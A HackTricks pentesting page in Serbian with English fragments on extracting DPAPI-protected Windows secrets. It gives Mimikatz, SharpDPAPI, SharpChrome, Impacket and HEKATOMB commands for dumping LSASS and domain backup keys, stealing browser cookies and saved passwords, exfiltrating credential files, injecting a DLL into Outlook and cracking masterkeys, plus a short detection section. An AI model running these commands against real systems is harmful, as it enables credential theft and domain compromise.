# DPAPI - Ekstrakcija lozinki

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

The Data Protection API (DPAPI) se primarno koristi u Windows operativnom sistemu za **simetričnu enkripciju asimetričnih privatnih ključeva**, koristeći ili korisničke ili sistemske tajne kao značajan izvor entropije. Ovaj pristup pojednostavljuje enkripciju za developere tako što im omogućava da šifruju podatke koristeći ključ izveden iz korisničkih logon tajni ili, za sistemsku enkripciju, iz tajni za autentifikaciju domena sistema, čime se eliminiše potreba da developeri sami upravljaju zaštitom ključa za enkripciju.

Najčešći način upotrebe DPAPI je preko **`CryptProtectData` i `CryptUnprotectData`** funkcija, koje omogućavaju aplikacijama da sigurno šifruju i dešifruju podatke sa sesijom procesa koji je trenutno prijavljen. To znači da šifrovane podatke može dešifrovati samo isti korisnik ili sistem koji ih je i šifrovao.

Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.

### Generisanje korisničkih ključeva

DPAPI generiše jedinstveni ključ (nazvan **`pre-key`**) za svakog korisnika zasnovan na njihovim akreditivima. Ovaj ključ se izvodi iz korisničke lozinke i drugih faktora, a algoritam zavisi od tipa korisnika ali se završava kao SHA1. Na primer, za korisnike domena, **zavisi od NTLM hash-a korisnika**.

Ovo je posebno interesantno jer ako napadač može da pribavi korisnički hash lozinke, može:

- **Dešifrovati bilo koje podatke koji su bili šifrovani koristeći DPAPI** sa tim korisničkim ključem bez potrebe za kontaktiranjem bilo kog API-ja
- Pokušati da **razbije lozinku** offline pokušavajući da generiše validan DPAPI ključ

Štaviše, svaki put kada korisnik šifruje neke podatke koristeći DPAPI, generiše se novi **master key**. Taj master key je onaj koji se zapravo koristi za šifrovanje podataka. Svakom master ključu je dodeljen **GUID** (Globally Unique Identifier) koji ga identifikuje.

Master ključevi se čuvaju u direktorijumu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gde je `{SID}` Security Identifier tog korisnika. Master ključ je sačuvan šifrovan pomoću korisničkog **`pre-key`** i takođe pomoću **rezervnog (backup) ključa domena** za oporavak (tako je isti ključ sačuvan šifrovan dva puta pomoću dva različita ključa).

Napomena da je **domain key koji se koristi za šifrovanje master ključa na domain controller-ima i nikada se ne menja**, tako da ako napadač ima pristup domain controller-u, može preuzeti rezervni ključ domena i dešifrovati master ključeve svih korisnika u domenu.

Šifrovani blobovi sadrže **GUID master ključa** koji je korišćen za šifrovanje podataka unutar svojih hedera.

> [!TIP]
> DPAPI encrypted blobs počinju sa **`01 00 00 00`**

Pronađi master ključeve:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

Ovo je ključ koji mašina koristi za enkriptovanje podataka. Baziran je na **DPAPI_SYSTEM LSA secret**, koji je specijalan ključ kojem može pristupiti samo SYSTEM user. Ovaj ključ se koristi za enkriptovanje podataka koji moraju biti dostupni samom sistemu, kao što su machine-level credentials ili system-wide secrets.

Obratite pažnju da ovi ključevi **nemaju rezervnu kopiju na domenu** pa su dostupni samo lokalno:

- **Mimikatz** može mu pristupiti ispisivanjem LSA secrets koristeći komandu: `mimikatz lsadump::secrets`
- Tajna je smeštena u registru, tako da administrator može **izmeniti DACL dozvole da bi joj pristupio**. Putanja u registru je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Takođe je moguća offline ekstrakcija iz registry hives. Na primer, kao administrator na cilju, sačuvajte hive-ove i izvezite ih:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Zatim, na vašem analysis box-u, oporavite DPAPI_SYSTEM LSA secret iz hives i upotrebite ga za dešifrovanje machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, itd.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Podaci zaštićeni pomoću DPAPI

Među ličnim podacima zaštićenim od strane DPAPI nalaze se:

- Windows creds
- Lozinke i podaci za automatsko popunjavanje Internet Explorer i Google Chrome
- Lozinke za e-mail i interne FTP naloge u aplikacijama kao što su Outlook i Windows Mail
- Lozinke za deljene foldere, resurse, bežične mreže i Windows Vault, uključujući enkripcijske ključeve
- Lozinke za remote desktop konekcije, .NET Passport i privatne ključeve za različite enkripcijske i autentifikacione svrhe
- Mrežne lozinke kojima upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i dr.
- Šifrovani blobovi unutar registra
- ...

Sistemski zaštićeni podaci uključuju:
- Wi‑Fi lozinke
- Lozinke za zakazane zadatke
- ...

### Opcije ekstrakcije master ključa

- Ako korisnik ima domain admin privilegije, može pristupiti **domain backup key** kako bi dekriptovao sve korisničke master ključeve u domenu:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Sa lokalnim administratorskim privilegijama moguće je **pristupiti LSASS memoriji** kako bi se izvukli DPAPI master ključevi svih povezanih korisnika i SYSTEM ključ.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ako korisnik ima lokalne administratorske privilegije, može pristupiti **DPAPI_SYSTEM LSA secret** da dešifruje glavne ključeve mašine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ako je poznata lozinka ili NTLM hash korisnika, možete **direktno dešifrovati master ključeve korisnika**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ako ste u sesiji kao korisnik, moguće je zatražiti od DC-a **backup key to decrypt the master keys using RPC**. Ako ste lokalni admin i korisnik je prijavljen, možete za ovo **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pristup DPAPI šifrovanim podacima

### Pronalaženje DPAPI šifrovanih podataka

Uobičajeni korisnički **zaštićeni fajlovi** nalaze se u:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Takođe proverite menjanjem `\Roaming\` u `\Local\` u gore navedenim putanjama.

Primeri enumeracije:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može pronaći DPAPI šifrovane blob-ove u fajl sistemu, registru i B64 blob-ovima:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Imajte na umu da [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može da se koristi za dešifrovanje osetljivih podataka pomoću DPAPI, kao što su cookies.

#### Chromium/Edge/Electron brzi recepti (SharpChrome)

- Trenutni korisnik, interaktivno dešifrovanje sačuvanih logins/cookies (radi čak i sa Chrome 127+ app-bound cookies jer se dodatni ključ rešava iz korisnikovog Credential Manager-a kada se pokreće u korisničkom kontekstu):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline analiza kada imate samo fajlove. Prvo ekstrahujte AES state key iz profila “Local State”, a zatim ga upotrebite da dešifrujete cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Trijaža na nivou cele domene/udaljena kada imate DPAPI domain backup key (PVK) i admin na ciljnom hostu:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ako imate DPAPI prekey/credkey korisnika (iz LSASS), možete preskočiti password cracking i direktno dešifrovati podatke profila:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Napomene
- Novije Chrome/Edge verzije mogu skladištiti određene kolačiće koristeći "App-Bound" enkripciju. Offline dekripcija tih specifičnih kolačića nije moguća bez dodatnog app-bound key; pokrenite SharpChrome u kontekstu ciljnog korisnika da biste ga automatski dohvatili. Pogledajte objavu na Chrome security blogu navedenu ispod.

### Pristupni ključevi i podaci

- **Koristite SharpDPAPI** da dobijete kredencijale iz DPAPI enkriptovanih fajlova iz trenutne sesije:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Preuzmi informacije o credentials** kao šifrovane podatke i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Pristup masterkeys**:

Dešifrujte masterkey korisnika koji zahteva **domain backup key** koristeći RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
The **SharpDPAPI** alat takođe podržava sledeće argumente za dešifrovanje masterkey-a (primetite kako je moguće koristiti `/rpc` da biste dobili domains backup key, `/password` da biste koristili plaintext password, ili `/pvk` da navedete DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dešifrujte podatke koristeći masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Alat **SharpDPAPI** takođe podržava ove argumente za dekripciju `credentials|vaults|rdg|keepass|triage|blob|ps` (primetite kako je moguće koristiti `/rpc` da biste dobili domains backup key, `/password` da biste koristili plaintext password, `/pvk` da biste naveli DPAPI domain private key file, `/unprotect` da biste koristili trenutnu korisničku sesiju...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Korišćenje DPAPI prekey/credkey direktno (nije potrebna lozinka)

Ako možete da dump-ujete LSASS, Mimikatz često izlaže per-logon DPAPI key koji se može koristiti za dešifrovanje korisnikovih masterkeys bez poznavanja plaintext password-a. Prosledite ovu vrednost direktno alatima:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Dešifruj neke podatke koristeći **trenutnu korisničku sesiju**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Vanmrežno dešifrovanje sa Impacket dpapi.py

Ako imate SID korisnika žrtve i njegovu lozinku (ili NT hash), možete dešifrovati DPAPI masterkeys i Credential Manager blobs potpuno vanmrežno koristeći Impacket’s dpapi.py.

- Identifikujte artefakte na disku:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Odgovarajući masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ako su alatke za prenos fajlova nepouzdane, base64-ujte fajlove na hostu i kopirajte izlaz:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Dekriptiraj masterkey koristeći korisnikov SID i password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Koristite dešifrovani masterkey da dešifrujete credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Ovaj tok rada često vraća domenske kredencijale koje su aplikacije sačuvale koristeći Windows Credential Manager, uključujući administratorske naloge (npr. `*_adm`).

---

### Rukovanje opcionom entropijom ("Third-party entropy")

Neke aplikacije prosleđuju dodatnu vrednost **entropy** funkciji `CryptProtectData`. Bez te vrednosti blob se ne može dešifrovati, čak i ako je poznat odgovarajući masterkey. Dobijanje entropije je stoga od suštinskog značaja prilikom ciljanja kredencijala zaštićenih na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je user-mode DLL koji hookuje DPAPI funkcije unutar ciljnog procesa i transparentno beleži svaku opcionu **entropy** koja je prosleđena. Pokretanje EntropyCapture u **DLL-injection** modu protiv procesa kao što su `outlook.exe` ili `vpnclient.exe` generisaće fajl koji mapira svaki entropy buffer na pozivajući proces i blob. Uhvaćena entropija se kasnije može proslediti alatima **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) kako bi se podaci dešifrovali.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Razbijanje masterkey-ja offline (Hashcat & DPAPISnoop)

Microsoft je uveo **context 3** masterkey format počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) je dodao hash-modeove **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), omogućavajući GPU-ubrzano krekovanje korisničkih lozinki direktno iz masterkey fajla. Napadači stoga mogu izvoditi word-list ili brute-force napade bez interakcije sa ciljnim sistemom.

`DPAPISnoop` (2024) automatizuje proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Alat takođe može parsirati Credential and Vault blobs, dekriptovati ih pomoću cracked keys i izvesti cleartext passwords.

### Pristup podacima drugog računara

U **SharpDPAPI and SharpChrome** možete navesti opciju **`/server:HOST`** da pristupite podacima udaljenog računara. Naravno, morate moći da pristupite tom računaru i u sledećem primeru se pretpostavlja da je poznat **domain backup encryption key**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ostali alati

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje ekstrakciju svih korisnika i računara iz LDAP direktorijuma i ekstrakciju ključa za rezervnu kopiju kontrolera domena preko RPC. Skripta će zatim razrešiti IP adrese svih računara i izvršiti smbclient na svim računarima da preuzme sve DPAPI blobove svih korisnika i dešifruje sve pomoću ključa za rezervnu kopiju domena.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Sa listom računara izvučenom iz LDAP-a možete pronaći svaku podmrežu čak i ako je niste znali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski iskopati tajne zaštićene DPAPI-jem. Verzija 2.x je uvela:

* Paralelno prikupljanje blobova sa stotina hostova
* Parsiranje **context 3** masterkey-eva i automatska integracija sa Hashcat za crackovanje
* Podrška za Chrome "App-Bound" šifrovane kolačiće (pogledajte sledeći odeljak)
* Novi **`--snapshot`** režim za ponovljeno ispitivanje endpointa i upoređivanje novo-nastalih blobova

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault fajlove koji može izbaciti Hashcat/JtR formate i opcionalno automatski pokrenuti crackovanje. Potpuno podržava machine i user masterkey formate do Windows 11 24H1.


## Uobičajena detekcija

- Pristup fajlovima u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim direktorijumima vezanim za DPAPI.
- Posebno sa mrežnog deljenja kao **C$** ili **ADMIN$**.
- Korišćenje **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili iskopavanje masterkey-eva.
- Event **4662**: *An operation was performed on an object* – može se povezati sa pristupom objektu **`BCKUPKEY`**.
- Event **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 ranjivosti & promene u ekosistemu

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Napadač sa mrežnim pristupom je mogao prevariti člana domena da preuzme maliciozni DPAPI backup ključ, omogućavajući dešifrovanje korisničkih masterkey-eva. Ispravljeno u kumulativnom ažuriranju iz novembra 2023 – administratori treba da osiguraju da su DCs i radne stanice potpuno zakrpljeni.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) je zamenio nasleđenu zaštitu zasnovanu samo na DPAPI sa dodatnim ključem koji se čuva u korisnikovom **Credential Manager**. Offline dešifrovanje kolačića sada zahteva i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu povratiti dodatni ključ kada rade u kontekstu korisnika.


### Studija slučaja: Zscaler Client Connector – prilagođena entropija izvedena iz SID-a

Zscaler Client Connector čuva nekoliko konfiguracionih fajlova pod `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaki fajl je enkriptovan pomoću **DPAPI (Machine scope)**, ali dobavljač obezbeđuje **prilagođenu entropiju** koja se *izračunava pri izvršavanju* umesto da se čuva na disku.

Entropija se rekonstruiše iz dva elementa:

1. Hard-kodirana tajna ugrađena unutar `ZSACredentialProvider.dll`.
2. **SID** Windows naloga kojem konfiguracija pripada.

Algoritam koji implementira DLL je ekvivalentan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Pošto je tajna ugrađena u DLL koja se može pročitati sa diska, **bilo koji lokalni napadač sa SYSTEM privilegijama može regenerisati entropiju za bilo koji SID** i dekriptovati blobove offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Dešifrovanje daje kompletnu JSON konfiguraciju, uključujući svaku **proveru statusa uređaja** i njenu očekivanu vrednost — informacije koje su veoma vredne pri pokušajima zaobilaženja na strani klijenta.

> TIP: ostali šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) su zaštićeni pomoću DPAPI **bez** entropije (`16` nul bajtova). Stoga se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` nakon što se dobiju SYSTEM privilegije.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
